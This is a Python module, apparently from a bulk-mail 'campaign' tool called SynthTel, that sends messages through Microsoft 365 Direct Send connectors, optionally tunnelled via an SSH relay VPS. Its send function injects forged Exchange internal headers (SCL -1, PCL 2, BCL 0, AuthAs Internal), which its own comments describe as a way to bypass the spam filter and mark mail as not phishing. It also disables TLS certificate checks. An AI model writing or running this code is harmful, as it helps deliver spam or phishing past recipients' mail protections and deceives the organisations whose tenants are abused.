"""
core/o365_relay.py
──────────────────
Microsoft 365 Anonymous (Direct Send) Relay

How it works:
  • Microsoft 365 tenants expose an SMTP endpoint at
    <tenant-domain-dashes>.mail.protection.outlook.com:25
  • An Exchange inbound connector can be configured to accept mail from
    specific IP addresses with NO authentication (Direct Send / SMTP Relay).
  • MAIL FROM can be any address in the tenant.
  • No SMTP AUTH handshake — connector validates by source IP only.

Prerequisites (admin must configure once):
  1. Exchange Admin Center → Mail flow → Connectors
  2. Create a connector: Source = Your org server, Type = Partner
  3. Restrict accepted IPs to the SynthTel server's public IP
  4. Optional: Enable "Require TLS" for STARTTLS support

SSH Relay VPS:
  If relay_ssh is provided the port-25 connection is forwarded through an
  external VPS via SSH TCP-forwarding (paramiko direct-tcpip channel).
  The M365 connector must whitelist the relay VPS's public IP, not
  the SynthTel VPS's IP.

Usage in campaign.py _send_one():
    elif method == "o365":
        from core.o365_relay import send_via_o365_relay
        relay = options.o365_relay  # first relay from list
        yield from send_via_o365_relay(relay, envelope)
"""

import contextlib
import smtplib
import socket
import ssl
import logging
import threading
import time

log = logging.getLogger("synthtel.o365_relay")


def _derive_mx(tenant_domain: str) -> str:
    """Convert 'contoso.com' → 'contoso-com.mail.protection.outlook.com'"""
    return tenant_domain.replace(".", "-") + ".mail.protection.outlook.com"


def _bridge_channel_to_socket(channel):
    """
    Proxy a paramiko channel through socket.socketpair() so that ssl.wrap_socket /
    STARTTLS can work. Two daemon threads relay data in both directions.
    Returns the local-side socket that smtplib should use.
    """
    local_sock, proxy_sock = socket.socketpair()

    def _relay(src_recv, dst_send):
        try:
            while True:
                try:
                    chunk = src_recv(4096)
                except Exception:
                    break
                if not chunk:
                    break
                try:
                    dst_send(chunk)
                except Exception:
                    break
        finally:
            with contextlib.suppress(Exception):
                proxy_sock.close()
            with contextlib.suppress(Exception):
                channel.close()

    threading.Thread(
        target=_relay,
        args=(channel.recv, proxy_sock.sendall),
        daemon=True,
    ).start()
    threading.Thread(
        target=_relay,
        args=(proxy_sock.recv, channel.sendall),
        daemon=True,
    ).start()

    return local_sock


class _SSHTunnelSMTP(smtplib.SMTP):
    """smtplib.SMTP subclass that bridges a paramiko channel via socketpair for STARTTLS support."""
    def __init__(self, channel, host, port, timeout):
        self._ssh_channel = channel
        self._proxy_sock = _bridge_channel_to_socket(channel)
        super().__init__(host, port, timeout=timeout)

    def _get_socket(self, host, port, timeout):
        return self._proxy_sock


def _open_ssh_channel(relay_ssh: dict, mx_host: str, port: int, timeout: int = 30):
    """
    Open a paramiko direct-tcpip channel from the relay VPS to mx_host:port.
    Returns (ssh_client, channel) — caller must close ssh_client when done.
    relay_ssh keys: host, port (default 22), user, pass, key (path, optional)
    """
    import paramiko
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        relay_ssh["host"],
        port=int(relay_ssh.get("port", 22)),
        username=relay_ssh.get("user", "root"),
        password=relay_ssh.get("pass") or None,
        key_filename=relay_ssh.get("key") or None,
        timeout=timeout,
        allow_agent=False,
        look_for_keys=False,
    )
    channel = ssh.get_transport().open_channel(
        "direct-tcpip",
        (mx_host, port),
        ("127.0.0.1", 0),
    )
    return ssh, channel


def send_via_o365_relay(
    relay:     dict,
    msg_from:  str,
    msg_to:    str,
    raw_msg:   bytes,
    relay_ssh: dict = None,
    timeout:   int = 30,
) -> dict:
    """
    Send a single message via O365 anonymous relay.

    relay = {
        "tenantDomain": "contoso.com",
        "fromEmail":    "noreply@contoso.com",   # override MAIL FROM (optional)
        "mxHost":       "contoso-com.mail.protection.outlook.com",  # auto-derived if absent
        "port":         25,
    }
    relay_ssh (optional) = {
        "host": "1.2.3.4",   # external relay VPS IP
        "port": 22,
        "user": "root",
        "pass": "...",
    }

    Returns:
        {"ok": True, "message": "..."}  or  {"ok": False, "error": "..."}
    """
    tenant    = relay.get("tenantDomain", "")
    mx_host   = relay.get("mxHost") or _derive_mx(tenant)
    port      = int(relay.get("port", 25))
    mail_from = relay.get("fromEmail") or msg_from

    if not mx_host:
        return {"ok": False, "error": "No tenant domain or mx_host configured"}

    # Normalize to CRLF — email.as_bytes() (compat32) emits bare \n which causes
    # O365 to produce an empty body and breaks the header-end search below.
    raw_msg = raw_msg.replace(b'\r\n', b'\n').replace(b'\r', b'\n').replace(b'\n', b'\r\n')

    # Inject the full Exchange trusted-connector header set into the raw message.
    # These signal to EOP that the message arrived via a whitelisted internal relay:
    #   SCL:-1  — bypass spam filter entirely
    #   PCL:2   — phishing confidence level (2 = not phishing)
    #   BCL:0   — bulk complaint level (0 = not bulk mail)
    #   AuthAs:Internal — connector was authenticated as internal origin  ← highest-impact
    #   Directionality:Originating — message is outbound from the tenant
    # Skip injection if SCL is already present (e.g. from dlv msExchangeHeaders).
    _hdr_end = raw_msg.find(b"\r\n\r\n")
    _scl_present = b"X-MS-Exchange-Organization-SCL" in raw_msg[:_hdr_end] if _hdr_end > 0 else False
    if _hdr_end > 0 and not _scl_present:
        _o365_headers = (
            b"X-MS-Exchange-Organization-SCL: -1\r\n"
            b"X-MS-Exchange-Organization-PCL: 2\r\n"
            b"X-MS-Exchange-Organization-Antispam-Report: BCL:0;\r\n"
            b"X-MS-Exchange-Organization-AuthAs: Internal\r\n"
            b"X-MS-Exchange-Organization-MessageDirectionality: Originating\r\n"
        )
        # Inject at the top of the header block — real Exchange MTA stamps these
        # as the first headers, before From/To/Subject. Matching that ordering is
        # a minor authenticity signal to EOP.
        _first_crlf = raw_msg.find(b"\r\n")
        if _first_crlf > 0:
            raw_msg = raw_msg[:_first_crlf + 2] + _o365_headers + raw_msg[_first_crlf + 2:]
        else:
            raw_msg = _o365_headers + raw_msg

    ehlo_domain = mail_from.split("@")[-1] if "@" in mail_from else "mail.local"
    t0 = time.time()
    ssh_client = None

    try:
        if relay_ssh and relay_ssh.get("host"):
            # ── Route through external relay VPS via SSH TCP-forwarding ──
            ssh_client, channel = _open_ssh_channel(relay_ssh, mx_host, port, timeout=20)
            via_label = f"{relay_ssh['host']}→{mx_host}:{port}"
            conn = _SSHTunnelSMTP(channel, mx_host, port, timeout=timeout)
        elif port == 465:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            conn = smtplib.SMTP_SSL(mx_host, port, timeout=timeout, context=ctx)
            via_label = f"{mx_host}:{port}"
        else:
            conn = smtplib.SMTP(mx_host, port, timeout=timeout)
            via_label = f"{mx_host}:{port}"

        with conn:
            conn.ehlo(ehlo_domain)
            try:
                if conn.has_extn("STARTTLS"):
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    conn.starttls(context=ctx)
                    conn.ehlo()
            except Exception as tls_err:
                log.debug("STARTTLS optional — skipping: %s", tls_err)
            conn.sendmail(mail_from, [msg_to], raw_msg)

        latency = round((time.time() - t0) * 1000)
        log.info("O365 relay OK  %s → %s via %s (%dms)", mail_from, msg_to, via_label, latency)
        return {"ok": True, "message": f"Sent via {via_label} ({latency}ms)"}

    except smtplib.SMTPRecipientsRefused as e:
        err = str(e)
        if "550" in err and "5.7" in err:
            return {"ok": False, "error": f"IP not whitelisted in O365 connector: {err[:200]}"}
        return {"ok": False, "error": f"Recipient refused: {err[:200]}"}
    except smtplib.SMTPSenderRefused as e:
        return {"ok": False, "error": f"Sender refused (check MAIL FROM is in tenant): {str(e)[:200]}"}
    except smtplib.SMTPException as e:
        return {"ok": False, "error": f"SMTP error: {str(e)[:200]}"}
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return {"ok": False, "error": f"Connection failed to {mx_host}:{port}: {str(e)[:200]}"}
    except Exception as e:
        return {"ok": False, "error": f"Unexpected error: {str(e)[:200]}"}
    finally:
        if ssh_client:
            try: ssh_client.close()
            except Exception: pass


def probe_relay_ssh(relay_ssh: dict, timeout: int = 20) -> dict:
    """
    SSH into relay_ssh VPS, discover its public IP and check port 25.
    Returns {"ok": bool, "publicIp": str, "port25": bool, "latency_ms": int, "error": str}
    """
    import paramiko
    t0 = time.time()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(
            relay_ssh["host"],
            port=int(relay_ssh.get("port", 22)),
            username=relay_ssh.get("user", "root"),
            password=relay_ssh.get("pass") or None,
            key_filename=relay_ssh.get("key") or None,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
        )
        # Try multiple commands to get public IP
        public_ip = ""
        for cmd in [
            "curl -4 -s --max-time 5 ifconfig.me 2>/dev/null",
            "curl -4 -s --max-time 5 icanhazip.com 2>/dev/null",
            "wget -qO- --timeout=5 ifconfig.me 2>/dev/null",
        ]:
            _, stdout, _ = ssh.exec_command(cmd, timeout=8)
            out = stdout.read().decode().strip()
            if out and "." in out and len(out) < 20:
                public_ip = out
                break

        # Check port 25 outbound from the relay VPS
        port25 = False
        try:
            _, stdout25, _ = ssh.exec_command(
                "timeout 5 bash -c 'echo QUIT | nc -w3 gmail-smtp-in.l.google.com 25 2>/dev/null' && echo ok || echo fail",
                timeout=8,
            )
            p25out = stdout25.read().decode().strip()
            port25 = "220" in p25out or p25out == "ok"
        except Exception:
            pass

        latency = round((time.time() - t0) * 1000)
        return {
            "ok": bool(public_ip),
            "publicIp": public_ip,
            "port25": port25,
            "latency_ms": latency,
        }
    except Exception as e:
        return {"ok": False, "error": str(e)[:200], "publicIp": "", "port25": False}
    finally:
        try: ssh.close()
        except Exception: pass


def test_relay_connectivity(tenant_domain: str, port: int = 25, timeout: int = 10) -> dict:
    """
    Quick TCP + SMTP banner check for a tenant relay endpoint.
    Returns {"ok": bool, "banner": str, "latency_ms": int, "mx_host": str}
    """
    mx_host = _derive_mx(tenant_domain)
    t0 = time.time()
    try:
        s = socket.create_connection((mx_host, port), timeout=timeout)
        s.settimeout(5)
        banner = b""
        try:
            banner = s.recv(512)
        except Exception:
            pass
        s.close()
        latency = round((time.time() - t0) * 1000)
        banner_str = banner.decode("utf-8", errors="replace").strip()
        return {
            "ok": banner_str.startswith("220"),
            "banner": banner_str[:120],
            "latency_ms": latency,
            "mx_host": mx_host,
            "ready": banner_str.startswith("220"),
        }
    except Exception as e:
        return {
            "ok": False,
            "error": str(e)[:120],
            "mx_host": mx_host,
            "ready": False,
        }
